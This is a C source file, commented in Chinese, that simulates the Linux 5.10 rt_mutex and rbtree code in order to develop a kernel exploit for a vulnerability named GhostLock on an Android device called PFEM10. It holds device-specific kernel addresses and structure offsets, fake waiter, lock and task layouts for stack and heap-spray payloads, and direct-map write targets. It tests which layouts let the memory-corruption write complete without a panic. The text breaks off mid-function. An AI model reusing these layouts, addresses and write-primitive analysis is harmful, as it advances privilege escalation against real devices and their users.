/*
 * rtmutex_model.c — CVE-2026-43499 (GhostLock) 5.10 rt_mutex 链遍历状态机模型 (PFEM10)
 *
 * 目的：在本地（不碰设备）验证定稿 §5 Step 1 的两个核心问题：
 *   A) "三趟改单趟"后 Z 页零残留是否成立（empty_zero_page 每次 boot 重载 → 单趟天然零残留）
 *   B) [10]-[12] 延续路径（owner≠0 → get_task_struct → pi_lock → [11] skip →
 *      task_blocked_on_lock → put_task_struct）在什么条件下不 panic
 *
 * 方法：把 android12-5.10 的 lib/rbtree.c + include/linux/rbtree_augmented.h +
 * kernel/locking/rtmutex.c（adjust_prio_chain / task_blocks_on_rt_mutex /
 * try_to_take_rt_mutex / remove_waiter / rt_mutex_cleanup_proxy_lock）逐行移植到
 * 字节寻址内存模型（zero page Z、W 栈上的 fd_set 假 waiter、任务结构页），
 * 每一步内存访问带越界/NULL 检测（= 内核 panic）。
 *
 * 结构体布局（PFEM10 5.10 GKI，vmlinux 反汇编 / oracle 定案）：
 *   rt_mutex_waiter: tree_entry@0x00(pc/right/left) pi_tree@0x18 task@0x30 lock@0x38
 *                    prio@0x40(u32) deadline@0x48(u64)          [0x50 compact, 无 wake_state/ww_ctx]
 *   rt_mutex:        wait_lock@0x00(u32) waiters.rb_root.rb_node@0x08
 *                    waiters.rb_leftmost@0x10 owner@0x18
 *   task_struct:     usage@0x40(u32) prio@0x84(u32) normal_prio@0x8C(u32)
 *                    pi_lock@0x878(u32) pi_waiters.rb_node@0x880 pi_waiters.rb_leftmost@0x888
 *                    pi_top_task@0x890 pi_blocked_on@0x898
 *
 * 符号地址（vmlinux.elf, _text=0xffffffc008000000）：
 *   Z (empty_zero_page)   = 0xffffffc00a9c3000
 *   init_task             = 0xffffffc0087cc000
 *
 * 用法:
 *   gcc -O0 -g -Wall -o rtmutex_model rtmutex_model.c
 *   ./rtmutex_model S      单趟 S（seed+泄露）fresh Z
 *   ./rtmutex_model U      单趟 U（usage 写 Z+0x40）fresh Z
 *   ./rtmutex_model D      单趟 D（owner 写 Z+0x18=Z|1 → [10]-[12]）fresh Z
 *   ./rtmutex_model D2     单趟 D 但 owner=init_task|1（单趟延续修复）fresh Z
 *   ./rtmutex_model SUD    三趟 S→U→D 共享 Z（v6 复现）
 *   ./rtmutex_model SUDX   三趟 + 进程退出清理（futex_cleanup→cleanup_proxy_lock→remove_waiter）
 *
 *   ./rtmutex_model HP           堆喷 fake_lock 单趟（FOPS 写形状, 期望干净）
 *   ./rtmutex_model HP slide     堆喷 fake_lock 单趟（SLIDE 写形状, 期望干净）
 *   ./rtmutex_model HP empty     堆喷 fake_lock 空树（期望 [11] dequeue_pi(NULL) panic）
 *   ./rtmutex_model HP w0hi      fake_w0 prio=130（[11] 分支1: 左子树被抢, pi_waiters
 *                                被链入 W 栈地址 — 模型实证为静默污染非必然 panic, 见结果）
 *   ./rtmutex_model HP usage0    fake_task usage=0（期望 [12] put → __put_task_struct panic）
 *
 * HP = 真机 payload 布局的本地闭合（2026-08-24，pfem10-spray/payload.h）:
 *   锚点块 HEAP_BASE（= 真机 base 的符号替身），页内偏移与 payload.h 一致：
 *     fake_lock@+0x1350（wait_lock=0, waiters.rb_node=rb_leftmost=fake_w0,
 *                         owner=fake_task|1）
 *     fake_w0@+0x2220（tree pc=1/right=0/left=0, prio=120 ≤ W prio, task/lock 指向页内）
 *     fake_task@+0x3200（usage=0x100, prio/normal_prio=120, pi_lock=0,
 *                        pi_waiters=0/0, pi_top_task=init_task, pi_blocked_on=0）
 *   直映射目标（真机 layout_probe 实测, kphys=0xa8000000）:
 *     misc.fops=0xffffff802a91a8e8 / logger=0xffffff802a7c14b8 /
 *     boot_id 槽=0xffffff802ab99b6d
 *   ⚠️ 偏移修正: task_struct.pi_lock 用 pfem10_target.h [C] 编译值 0x86C
 *     （原模型 0x878 系设计文档旧稿; panic 实证 pi_blocked_on=0x898 两表一致）
 *
 * ⚠️ 这是本地模型，不是真机验证；结论仅用于决定是否/如何碰设备。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef int32_t  s32;

/* ============ 1. 符号地址与结构体偏移 (PFEM10) ============ */
#define Z_ADDR            0xffffffc00a9c3000ULL   /* empty_zero_page */
#define INIT_TASK_ADDR    0xffffffc0087cc000ULL   /* init_task */

#define OFF_TASK_USAGE        0x40   /* u32, get/put_task_struct 反汇编实锤 */
#define OFF_TASK_PRIO         0x84   /* u32 */
#define OFF_TASK_NORMAL_PRIO  0x8c   /* u32 */
#define OFF_TASK_PI_LOCK      0x86C  /* u32 [C] pfem10_target.h 编译值（旧稿 0x878 已弃） */
#define OFF_TASK_PI_WAITERS   0x880  /* rb_root_cached: rb_node@0x880, leftmost@0x888 */
#define OFF_TASK_PI_TOP       0x890
#define OFF_TASK_PI_BLOCKED   0x898
#define OFF_TASK_STATE        0x04   /* model 用占位（init_task/Z 均为 0 → TASK_RUNNING → wake no-op） */

/* W 的 dl.deadline（仅 [7] 写回假 waiter+0x48 用，模型值恒 0） */
#define OFF_TASK_DL_DEADLINE  0x1b0

/* ============ 1b. 堆喷 payload 页（HP 场景, 与 pfem10-spray/payload.h 一致） ============ */
#define HEAP_BASE  0xffffffc200000000ULL   /* 锚点 32KB 块（真机 base 的符号替身） */
#define HEAP_LOCK  0x1350                  /* fake_lock: rt_mutex */
#define HEAP_W0    0x2220                  /* fake_w0  : rt_mutex_waiter（树哨兵） */
#define HEAP_TASK  0x3200                  /* fake_task: task_struct 形态 */
#define HEAP_FOPS  0x1000                  /* fake_fops: file_operations 表 */
#define HEAP_FOPS_LLSEEK 0x08              /* 表槽: [7] __rb_change_child 副作用落点之一 */
#define HEAP_FOPS_READ   0x10              /* 表槽: 副作用落点之二 */

/* 直映射写目标（layout_probe 真机值, kphys=0xa8000000, Δ=0x28000000） */
#define DMAP_BASE       0xffffff802a000000ULL
#define ALIAS_MISC_FOPS 0xffffff802a91a8e8ULL
#define ALIAS_LOGGER    0xffffff802a7c14b8ULL  /* SLIDE 写值（base; +0x20/LOGGERS_0_1 与 slide.c 对齐留待移植） */
#define ALIAS_BOOT_ID   0xffffff802ab99b6dULL
#define ROOT_TG_ADDR    0xffffffc00a9c8040ULL  /* root_task_group（只写不读, 保险映射） */

#define MAX_DL_PRIO 100
#define dl_prio(p) ((p) < MAX_DL_PRIO)
#define dl_time_before(a,b) ((a) < (b))

/* 每趟独立对象基址（symbolic，互不重叠） */
#define PASS_BASE(p)        (0xffffffc100000000ULL + (u64)(p) * 0x100000ULL)
#define W_STACK(p)          (PASS_BASE(p) + 0x00000)   /* W 内核栈（fd_set 假 waiter 区域） */
#define M_STACK(p)          (PASS_BASE(p) + 0x10000)
#define O_STACK(p)          (PASS_BASE(p) + 0x20000)
#define TASK_W(p)           (PASS_BASE(p) + 0x40000)   /* W 的 task_struct */
#define TASK_M(p)           (PASS_BASE(p) + 0x50000)
#define TASK_O(p)           (PASS_BASE(p) + 0x60000)
#define FUTEX_LOCK(p)       (PASS_BASE(p) + 0x70000)   /* cycle_futex 的 rt_mutex（真锁） */

#define WAITER_OFF          0x840                        /* W 栈上假 waiter 基址偏移（fd_set bits 区） */
#define MWAITER_OFF         0x400                        /* M 栈上 M 的 rt_waiter */
#define OWAITER_OFF         0x400                        /* O 栈上 O 的 rt_waiter */

/* ============ 2. 内存模型 ============ */
#define MAX_PAGES 64
typedef struct {
    u64 base;
    u64 len;
    unsigned char *data;
    int is_zero_page;   /* Z 的写要 trace */
} page_t;

static page_t pages[MAX_PAGES];
static int npages = 0;
static int fault_pending = 0;    /* 本场景已 panic，停止执行 */
static u64 fault_addr = 0;
static const char *fault_where = NULL;

static page_t *find_page(u64 a)
{
    for (int i = 0; i < npages; i++)
        if (a >= pages[i].base && a < pages[i].base + pages[i].len)
            return &pages[i];
    return NULL;
}

static page_t *add_page(u64 base, u64 len, int zero)
{
    page_t *p = &pages[npages++];
    p->base = base; p->len = len; p->is_zero_page = zero;
    p->data = calloc(1, len);
    return p;
}

static int mapped(u64 a) { return find_page(a) != NULL; }

static void panic_at(u64 a, const char *where)
{
    if (fault_pending) return;
    fault_pending = 1;
    fault_addr = a;
    fault_where = where;
}

static u64 rd64(u64 a)
{
    page_t *p = find_page(a);
    if (!p) { panic_at(a, "rd64 unmapped"); return 0; }
    if (a + 8 > p->base + p->len) { panic_at(a, "rd64 overflow"); return 0; }
    u64 v; memcpy(&v, p->data + (a - p->base), 8); return v;
}

static u32 rd32(u64 a)
{
    page_t *p = find_page(a);
    if (!p) { panic_at(a, "rd32 unmapped"); return 0; }
    if (a + 4 > p->base + p->len) { panic_at(a, "rd32 overflow"); return 0; }
    u32 v; memcpy(&v, p->data + (a - p->base), 4); return v;
}

static void wr64(u64 a, u64 v)
{
    page_t *p = find_page(a);
    if (!p) { panic_at(a, "wr64 unmapped"); return; }
    if (a + 8 > p->base + p->len) { panic_at(a, "wr64 overflow"); return; }
    memcpy(p->data + (a - p->base), &v, 8);
}

static void wr32(u64 a, u32 v)
{
    page_t *p = find_page(a);
    if (!p) { panic_at(a, "wr32 unmapped"); return; }
    if (a + 4 > p->base + p->len) { panic_at(a, "wr32 overflow"); return; }
    memcpy(p->data + (a - p->base), &v, 4);
}

/* 写 trace：Z / 堆喷页 / 直映射目标（HP 场景证据） */
static int traced_region(u64 a, u64 *base_out)
{
    if (a >= Z_ADDR && a < Z_ADDR + 4096)      { *base_out = Z_ADDR;    return 1; }
    if (a >= HEAP_BASE && a < HEAP_BASE + 0x8000) { *base_out = HEAP_BASE; return 1; }
    if (a >= DMAP_BASE && a < DMAP_BASE + 0xc00000) { *base_out = DMAP_BASE; return 1; }
    return 0;
}

static void ztr(u64 base, u64 a, u64 v, const char *tag)
{
    const char *name = (base == Z_ADDR) ? "Z" : (base == HEAP_BASE) ? "heap" : "dmap";
    printf("    [%s] %-34s %s+0x%03llx = 0x%016llx\n", name, tag, name,
           (unsigned long long)(a - base), (unsigned long long)v);
}

static void z_wr64(u64 a, u64 v, const char *tag)
{
    u64 base;
    if (traced_region(a, &base)) ztr(base, a, v, tag);
    wr64(a, v);
}

static void z_wr32(u64 a, u32 v, const char *tag)
{
    u64 base;
    if (traced_region(a, &base)) ztr(base, a, v, tag);
    wr32(a, v);
}

/* ============ 3. 自旋锁模型（单线程：记录持有状态） ============ */
static int lock_held(u64 a) { return rd32(a) != 0; }

static void sl_lock(u64 a)
{
    if (lock_held(a)) { printf("    [lock] %s: CONTENDED spin_lock(%016llx) → HANG\n",
                               fault_where ? fault_where : "?", (unsigned long long)a); panic_at(a, "spin_lock contended"); return; }
    wr32(a, 1);
}
static int sl_trylock(u64 a)
{
    if (lock_held(a)) return 0;
    wr32(a, 1);
    return 1;
}
static void sl_unlock(u64 a) { wr32(a, 0); }

/* ============ 4. rbtree 移植（android12-5.10 逐行，内存模型适配） ============ */
#define RB_RED   0
#define RB_BLACK 1

#define rb_pc(n)       (rd64((n) + 0x00))
#define rb_right(n)    (rd64((n) + 0x08))
#define rb_left(n)     (rd64((n) + 0x10))
#define rb_wpc(n, v)   (z_wr64((n) + 0x00, (v), "rb.pc"))
#define rb_wright(n,v) (z_wr64((n) + 0x08, (v), "rb.right"))
#define rb_wleft(n,v)  (z_wr64((n) + 0x10, (v), "rb.left"))
#define rb_color(n)    (rb_pc(n) & 1)
#define rb_is_red(n)   (!rb_color(n))
#define rb_is_black(n) (rb_color(n))
#define rb_parent(n)   (rb_pc(n) & ~3ULL)
#define __rb_parent(pc)((pc) & ~3ULL)
#define __rb_is_black(pc) ((pc) & 1)
#define rb_red_parent(n) (rb_pc(n))
#define RB_EMPTY_NODE(n) (rb_pc(n) == (u64)(n))
#define RB_CLEAR_NODE(n) (rb_wpc((n), (u64)(n)))

static u64 rb_next_node(u64 node);   /* 前向声明（rb_erase_cached 使用） */

static void rb_set_parent_color(u64 rb, u64 p, int color)
{
    rb_wpc(rb, (p | color));
}
static void rb_set_black(u64 rb) { rb_wpc(rb, rb_pc(rb) | RB_BLACK); }
static void rb_set_parent(u64 rb, u64 p) { rb_wpc(rb, rb_color(rb) | p); }

static void rb_link_node(u64 rb, u64 parent, u64 *rb_link)
{
    rb_wpc(rb, parent);
    rb_wleft(rb, 0);
    rb_wright(rb, 0);
    *rb_link = rb;
}

static void __rb_change_child(u64 old, u64 new, u64 parent, u64 root)
{
    if (parent) {
        if (rb_left(parent) == old)
            rb_wleft(parent, new);
        else
            rb_wright(parent, new);
    } else {
        z_wr64(root + 0x00, new, "root.rb_node");   /* rb_root.rb_node 在 rb_root_cached+0x00 */
    }
}

static void __rb_rotate_set_parents(u64 old, u64 new, u64 root, int color)
{
    u64 parent = rb_parent(old);
    rb_wpc(new, rb_pc(old));
    rb_set_parent_color(old, new, color);
    __rb_change_child(old, new, parent, root);
}

static void dummy_propagate(u64 node, u64 stop) { (void)node; (void)stop; }
static void dummy_copy(u64 old, u64 new) { (void)old; (void)new; }
static void dummy_rotate(u64 old, u64 new) { (void)old; (void)new; }

/* __rb_insert — rbtree.c 87-222 逐行 */
static void __rb_insert(u64 node, u64 root)
{
    u64 parent = rb_red_parent(node), gparent, tmp;

    while (1) {
        if (!parent) {
            rb_set_parent_color(node, 0, RB_BLACK);
            break;
        }
        if (rb_is_black(parent))
            break;

        gparent = rb_red_parent(parent);
        tmp = rb_right(gparent);
        if (parent != tmp) {            /* parent == gparent->rb_left */
            if (tmp && rb_is_red(tmp)) {
                rb_set_parent_color(tmp, gparent, RB_BLACK);
                rb_set_parent_color(parent, gparent, RB_BLACK);
                node = gparent;
                parent = rb_parent(node);
                rb_set_parent_color(node, parent, RB_RED);
                continue;
            }
            tmp = rb_right(parent);
            if (node == tmp) {
                tmp = rb_left(node);
                rb_wright(parent, tmp);
                rb_wleft(node, parent);
                if (tmp)
                    rb_set_parent_color(tmp, parent, RB_BLACK);
                rb_set_parent_color(parent, node, RB_RED);
                dummy_rotate(parent, node);
                parent = node;
                tmp = rb_right(node);
            }
            rb_wleft(gparent, tmp);          /* == parent->rb_right */
            rb_wright(parent, gparent);
            if (tmp)
                rb_set_parent_color(tmp, gparent, RB_BLACK);
            __rb_rotate_set_parents(gparent, parent, root, RB_RED);
            dummy_rotate(gparent, parent);
            break;
        } else {
            tmp = rb_left(gparent);
            if (tmp && rb_is_red(tmp)) {
                rb_set_parent_color(tmp, gparent, RB_BLACK);
                rb_set_parent_color(parent, gparent, RB_BLACK);
                node = gparent;
                parent = rb_parent(node);
                rb_set_parent_color(node, parent, RB_RED);
                continue;
            }
            tmp = rb_left(parent);
            if (node == tmp) {
                tmp = rb_right(node);
                rb_wleft(parent, tmp);
                rb_wright(node, parent);
                if (tmp)
                    rb_set_parent_color(tmp, parent, RB_BLACK);
                rb_set_parent_color(parent, node, RB_RED);
                dummy_rotate(parent, node);
                parent = node;
                tmp = rb_left(node);
            }
            rb_wright(gparent, tmp);         /* == parent->rb_left */
            rb_wleft(parent, gparent);
            if (tmp)
                rb_set_parent_color(tmp, gparent, RB_BLACK);
            __rb_rotate_set_parents(gparent, parent, root, RB_RED);
            dummy_rotate(gparent, parent);
            break;
        }
    }
}

/* ____rb_erase_color — rbtree.c 227-410 逐行（Case 1-right + 黑父无子时触发） */
static void ____rb_erase_color(u64 parent, u64 root)
{
    u64 node = 0, sibling, tmp1, tmp2;

    while (1) {
        sibling = rb_right(parent);
        if (node != sibling) {           /* node == parent->rb_left */
            if (rb_is_red(sibling)) {
                tmp1 = rb_left(sibling);
                rb_wright(parent, tmp1);
                rb_wleft(sibling, parent);
                rb_set_parent_color(tmp1, parent, RB_BLACK);
                __rb_rotate_set_parents(parent, sibling, root, RB_RED);
                dummy_rotate(parent, sibling);
                sibling = tmp1;
            }
            if (rb_is_black(rb_left(sibling))) {
                if (rb_is_black(rb_right(sibling))) {
                    rb_set_parent_color(sibling, parent, RB_RED);
                    node = parent;
                    parent = rb_parent(node);
                    if (!parent) break;
                    continue;
                }
                tmp1 = rb_right(sibling);
                tmp2 = rb_left(tmp1);
                rb_wright(sibling, tmp2);
                rb_wleft(tmp1, sibling);
                rb_set_parent_color(tmp2, sibling, RB_BLACK);
                dummy_rotate(sibling, tmp1);
                tmp2 = rb_right(tmp1);
                rb_set_parent_color(tmp2, parent, RB_BLACK);
                rb_wright(parent, tmp1);
                rb_set_parent_color(tmp1, parent, RB_BLACK);
                __rb_change_child(parent, tmp1, rb_parent(parent), root);
                break;
            }
            tmp2 = rb_left(sibling);
            tmp1 = rb_right(sibling);
            rb_wleft(sibling, tmp1);
            rb_wright(parent, sibling);
            rb_set_parent_color(tmp1, sibling, RB_BLACK);
            __rb_rotate_set_parents(parent, sibling, root, RB_BLACK);
            dummy_rotate(parent, sibling);
            break;
        } else {                        /* node == parent->rb_right */
            sibling = rb_left(parent);
            if (rb_is_red(sibling)) {
                tmp1 = rb_right(sibling);
                rb_wleft(parent, tmp1);
                rb_wright(sibling, parent);
                rb_set_parent_color(tmp1, parent, RB_BLACK);
                __rb_rotate_set_parents(parent, sibling, root, RB_RED);
                dummy_rotate(parent, sibling);
                sibling = tmp1;
            }
            if (rb_is_black(rb_right(sibling))) {
                if (rb_is_black(rb_left(sibling))) {
                    rb_set_parent_color(sibling, parent, RB_RED);
                    node = parent;
                    parent = rb_parent(node);
                    if (!parent) break;
                    continue;
                }
                tmp1 = rb_left(sibling);
                tmp2 = rb_right(tmp1);
                rb_wleft(sibling, tmp2);
                rb_wright(tmp1, sibling);
                rb_set_parent_color(tmp2, sibling, RB_BLACK);
                dummy_rotate(sibling, tmp1);
                tmp2 = rb_right(tmp1);
                rb_set_parent_color(tmp2, parent, RB_BLACK);
                rb_wleft(parent, tmp1);
                rb_set_parent_color(tmp1, parent, RB_BLACK);
                __rb_change_child(parent, tmp1, rb_parent(parent), root);
                break;
            }
            tmp2 = rb_right(sibling);
            tmp1 = rb_left(sibling);
            rb_wright(sibling, tmp1);
            rb_wleft(parent, sibling);
            rb_set_parent_color(tmp1, sibling, RB_BLACK);
            __rb_rotate_set_parents(parent, sibling, root, RB_BLACK);
            dummy_rotate(parent, sibling);
            break;
        }
    }
}

/* __rb_erase_augmented — rbtree_augmented.h 逐行 */
static u64 __rb_erase_augmented(u64 node, u64 root)
{
    u64 child = rb_right(node);
    u64 tmp = rb_left(node);
    u64 parent, rebalance;
    u64 pc;

    if (!tmp) {
        /* Case 1: no left child */
        pc = rb_pc(node);
        parent = __rb_parent(pc);
        __rb_change_child(node, child, parent, root);
        if (child) {
            rb_wpc(child, pc);
            rebalance = 0;
        } else
            rebalance = __rb_is_black(pc) ? parent : 0;
        tmp = parent;
    } else if (!child) {
        /* Case 1-left: only left child → ★ 写原语 *(rb_left) = pc */
        rb_wpc(tmp, pc = rb_pc(node));
        parent = __rb_parent(pc);
        __rb_change_child(node, tmp, parent, root);
        rebalance = 0;
        tmp = parent;
    } else {
        u64 successor = child, child2;

        tmp = rb_left(child);
        if (!tmp) {
            /* Case 2 */
            parent = successor;
            child2 = rb_right(successor);
            dummy_copy(node, successor);
        } else {
            /* Case 3 */
            do {
                parent = successor;
                successor = tmp;
                tmp = rb_left(tmp);
            } while (tmp);
            child2 = rb_right(successor);
            rb_wleft(parent, child2);
            rb_wright(successor, child);
            rb_set_parent(child, successor);
            dummy_copy(node, successor);
            dummy_propagate(parent, successor);
        }
        tmp = rb_left(node);
        rb_wleft(successor, tmp);
        rb_set_parent(tmp, successor);
        pc = rb_pc(node);
        tmp = __rb_parent(pc);
        __rb_change_child(node, successor, tmp, root);
        if (child2) {
            rb_set_parent_color(child2, parent, RB_BLACK);
            rebalance = 0;
        } else {
            rebalance = rb_is_black(successor) ? parent : 0;
        }
        rb_wpc(successor, pc);
        tmp = successor;
    }
    dummy_propagate(tmp, 0);
    return rebalance;
}

static void rb_erase(u64 node, u64 root)
{
    u64 rebalance = __rb_erase_augmented(node, root);
    if (rebalance)
        ____rb_erase_color(rebalance, root);
}

static void rb_erase_cached(u64 node, u64 root)
{
    if (rd64(root + 0x08) == node)                       /* root->rb_leftmost @+0x08 */
        z_wr64(root + 0x08, rb_next_node(node), "leftmost=rb_next");
    rb_erase(node, root);
}

/* rb_next — rbtree.c 505-533 */
static u64 rb_next_node(u64 node)
{
    u64 parent;
    if (RB_EMPTY_NODE(node))
        return 0;
    if (rb_right(node)) {
        node = rb_right(node);
        while (rb_left(node))
            node = rb_left(node);
        return node;
    }
    while ((parent = rb_parent(node)) && node == rb_right(parent))
        node = parent;
    return parent;
}

static u64 rb_first(u64 root)
{
    u64 n = rd64(root + 0x00);           /* rb_root.rb_node @+0x00 */
    if (!n) return 0;
    while (rb_left(n))
        n = rb_left(n);
    return n;
}

static u64 rb_first_cached(u64 root)
{
    u64 lm = rd64(root + 0x08);          /* rb_leftmost @+0x08 */
    if (lm) return lm;
    return rb_first(root);
}

static void rb_insert_color_cached(u64 node, u64 root, bool leftmost)
{
    if (leftmost)
        z_wr64(root + 0x08, node, "leftmost=node");
    __rb_insert(node, root);
}

/* ============ 5. rtmutex 移植 ============ */
#define WAITER_TREE_OFF 0x00
#define WAITER_PI_OFF   0x18
#define W_TASK_OFF      0x30
#define W_LOCK_OFF      0x38
#define W_PRIO_OFF      0x40
#define W_DEADLINE_OFF  0x48

static u64 rb_entry_tree(u64 x) { return x - WAITER_TREE_OFF; }   /* = x */
static u64 rb_entry_pi(u64 x)   { return x - WAITER_PI_OFF; }

static int rt_mutex_waiter_less(u64 left, u64 right)
{
    u32 lp = rd32(left + W_PRIO_OFF), rp = rd32(right + W_PRIO_OFF);
    if (lp < rp) return 1;
    if (dl_prio(lp))
        return dl_time_before(rd64(left + W_DEADLINE_OFF), rd64(right + W_DEADLINE_OFF));
    return 0;
}

static int rt_mutex_waiter_equal(u64 left, u64 right)
{
    u32 lp = rd32(left + W_PRIO_OFF), rp = rd32(right + W_PRIO_OFF);
    if (lp != rp) return 0;
    if (dl_prio(lp))
        return rd64(left + W_DEADLINE_OFF) == rd64(right + W_DEADLINE_OFF);
    return 1;
}

static void rt_mutex_enqueue(u64 lock, u64 waiter)
{
    u64 link_addr = lock + 0x08;   /* &lock->waiters.rb_root.rb_node */
    u64 parent = 0, entry;
    bool leftmost = true;

    for (;;) {
        u64 cur = rd64(link_addr);
        if (!cur) break;
        parent = cur;
        entry = rb_entry_tree(parent);
        if (rt_mutex_waiter_less(waiter, entry)) {
            link_addr = parent + 0x10;      /* &parent->rb_left */
        } else {
            link_addr = parent + 0x08;      /* &parent->rb_right */
            leftmost = false;
        }
    }
    /* rb_link_node: 写 pc/left/right + 槽 */
    rb_wpc(waiter, parent);
    rb_wleft(waiter, 0);
    rb_wright(waiter, 0);
    z_wr64(link_addr, waiter, "enqueue.link");
    rb_insert_color_cached(waiter, lock + 0x08, leftmost);
}

static void rt_mutex_dequeue(u64 lock, u64 waiter)
{
    if (RB_EMPTY_NODE(waiter + WAITER_TREE_OFF))
        return;
    rb_erase_cached(waiter + WAITER_TREE_OFF, lock + 0x08);
    RB_CLEAR_NODE(waiter + WAITER_TREE_OFF);
}

static void rt_mutex_enqueue_pi(u64 task, u64 waiter)
{
    u64 link_addr = task + OFF_TASK_PI_WAITERS + 0x00;  /* &task->pi_waiters.rb_root.rb_node */
    u64 parent = 0, entry;
    bool leftmost = true;

    for (;;) {
        u64 cur = rd64(link_addr);
        if (!cur) break;
        parent = cur;
        entry = rb_entry_pi(parent);
        if (rt_mutex_waiter_less(waiter, entry)) {
            link_addr = parent + 0x10;
        } else {
            link_addr = parent + 0x08;
            leftmost = false;
        }
    }
    rb_wpc(waiter + WAITER_PI_OFF, parent);
    rb_wleft(waiter + WAITER_PI_OFF, 0);
    rb_wright(waiter + WAITER_PI_OFF, 0);
    wr64(link_addr, waiter + WAITER_PI_OFF);          /* 树存 pi_tree_entry 节点地址 */
    if (leftmost)
        wr64(task + OFF_TASK_PI_WAITERS + 0x08, waiter + WAITER_PI_OFF);
    __rb_insert(waiter + WAITER_PI_OFF, task + OFF_TASK_PI_WAITERS);
}

static void rt_mutex_dequeue_pi(u64 task, u64 waiter)
{
    if (RB_EMPTY_NODE(waiter + WAITER_PI_OFF))
        return;
    rb_erase_cached(waiter + WAITER_PI_OFF, task + OFF_TASK_PI_WAITERS);
    RB_CLEAR_NODE(waiter + WAITER_PI_OFF);
}

static u64 rt_mutex_top_waiter(u64 lock)
{
    return rb_first_cached(lock + 0x08);
}

static int task_has_pi_waiters(u64 task)
{
    return rd64(task + OFF_TASK_PI_WAITERS + 0x00) != 0;
}
static u64 task_top_pi_waiter(u64 task)
{
    return rb_entry_pi(rb_first_cached(task + OFF_TASK_PI_WAITERS));
}
static u64 task_blocked_on_lock(u64 task)
{
    u64 w = rd64(task + OFF_TASK_PI_BLOCKED);
    if (!w) return 0;
    return rd64(w + W_LOCK_OFF);
}

static u64 task_to_waiter_prio(u64 task)   { return rd32(task + OFF_TASK_PRIO); }
static u64 task_to_waiter_deadline(u64 task){ return rd64(task + OFF_TASK_DL_DEADLINE); }

static u64 rt_mutex_owner(u64 lock)
{
    return rd64(lock + 0x18) & ~1ULL;
}
static void mark_rt_mutex_waiters(u64 lock)
{
    wr64(lock + 0x18, rd64(lock + 0x18) | 1ULL);
}

/* 简化 rt_mutex_setprio：仅反映 early-return 语义与 pi_top_task 更新 */
static void rt_mutex_setprio(u64 p, u64 pi_task)
{
    u32 prio = rd32(p + OFF_TASK_PRIO);
    if (rd64(p + OFF_TASK_PI_TOP) == (u64)pi_task && prio == 120 && !dl_prio(prio))
        return;
    wr32(p + OFF_TASK_PRIO, 120);
    wr64(p + OFF_TASK_PI_TOP, (u64)pi_task);
}

static void rt_mutex_adjust_prio(u64 p)
{
    u64 pi_task = 0;
    if (task_has_pi_waiters(p))
        pi_task = rd64(task_top_pi_waiter(p) + W_TASK_OFF);
    rt_mutex_setprio(p, pi_task);
}

/* wake_up_process 简化：NULL → panic；TASK_RUNNING(0) → no-op（匹配 v4 实测） */
static void wake_up_process(u64 p)
{
    if (!p) { panic_at(0, "wake_up_process(NULL)"); return; }
    u32 st = rd32(p + OFF_TASK_STATE);
    if (st & (1 | 2))  /* TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE */
        printf("    [wake] wake_up_process(%016llx) state=%u → wake\n",
               (unsigned long long)p, st);
    else
        printf("    [wake] wake_up_process(%016llx) state=%u → no-op\n",
               (unsigned long long)p, st);
}

/* get/put_task_struct：usage@+0x40；put 到 0 → 模型判定 panic（__put_task_struct free 垃圾） */
static u64 get_task_struct(u64 task)
{
    u32 u = rd32(task + OFF_TASK_USAGE) + 1;
    wr32(task + OFF_TASK_USAGE, u);
    printf("    [ref] get_task_struct(%016llx) usage=%u\n", (unsigned long long)task, u);
    return task;
}
static void put_task_struct(u64 task)
{
    u32 u = rd32(task + OFF_TASK_USAGE) - 1;
    wr32(task + OFF_TASK_USAGE, u);
    printf("    [ref] put_task_struct(%016llx) usage=%u%s\n",
           (unsigned long long)task, u, u == 0 ? "  ★ USAGE→0 → __put_task_struct(free 垃圾) → PANIC" : "");
    if (u == 0)
        panic_at(task, "put_task_struct freed task");
}

enum rtmutex_chainwalk { RT_MUTEX_MIN_CHAINWALK = 0, RT_MUTEX_FULL_CHAINWALK = 1 };
static int max_lock_depth = 1024;

static int rt_mutex_cond_detect_deadlock(u64 orig_waiter, int chwalk)
{
    return (chwalk == RT_MUTEX_FULL_CHAINWALK) && (orig_waiter != 0);
}

/* rt_mutex_adjust_prio_chain — rtmutex.c 448-800 逐行移植 */
static u64 g_cur_task;   /* current（模型里 = 该趟 M 线程） */

static int rt_mutex_adjust_prio_chain(u64 task, int chwalk, u64 orig_lock,
                                      u64 next_lock, u64 orig_waiter, u64 top_task)
{
    u64 waiter, top_waiter = orig_waiter;
    u64 prerequeue_top_waiter;
    int ret = 0, depth = 0;
    u64 lock;
    bool detect_deadlock, requeue = true;

    detect_deadlock = rt_mutex_cond_detect_deadlock(orig_waiter, chwalk);

again:
    if (++depth > max_lock_depth) {
        put_task_struct(task);
        return -4; /* -EDEADLK */
    }
retry:
    sl_lock(task + OFF_TASK_PI_LOCK);
    printf("  [1] pi_lock(%016llx) held\n", (unsigned long long)(task + OFF_TASK_PI_LOCK));

    waiter = rd64(task + OFF_TASK_PI_BLOCKED);
    printf("  [2] waiter = task->pi_blocked_on = %016llx\n", (unsigned long long)waiter);

    if (!waiter) goto out_unlock_pi;
    if (orig_waiter && !rt_mutex_owner(orig_lock)) goto out_unlock_pi;
    if (next_lock != rd64(waiter + W_LOCK_OFF)) {
        printf("  [3] abort: next_lock(%016llx) != waiter->lock(%016llx)\n",
               (unsigned long long)next_lock, (unsigned long long)rd64(waiter + W_LOCK_OFF));
        goto out_unlock_pi;
    }
    printf("  [3] pass: next_lock == waiter->lock\n");
    if (top_waiter) {
        if (!task_has_pi_waiters(task)) { printf("  [3] abort: task has no pi_waiters\n"); goto out_unlock_pi; }
        if (top_waiter != task_top_pi_waiter(task)) {
            if (!detect_deadlock) { printf("  [3] abort: not top pi waiter\n"); goto out_unlock_pi; }
            requeue = false;
        }
    }
    printf("  [3] pass: top_waiter == task_top_pi_waiter\n");
    /* rt_mutex_waiter_equal(waiter, task_to_waiter(task)) 显式实现 */
    {
        u64 fake = waiter;
        u32 fp = rd32(fake + W_PRIO_OFF);
        u32 tp = rd32(task + OFF_TASK_PRIO);
        u64 fd = rd64(fake + W_DEADLINE_OFF);
        u64 td = rd64(task + OFF_TASK_DL_DEADLINE);
        int eq = (fp == tp) && (!dl_prio(fp) || fd == td);
        if (eq) {
            if (!detect_deadlock) goto out_unlock_pi;
            requeue = false;
        }
        printf("  [3] pass: fake.prio=%u vs task.prio=%u → requeue=%d\n", fp, tp, requeue);
    }
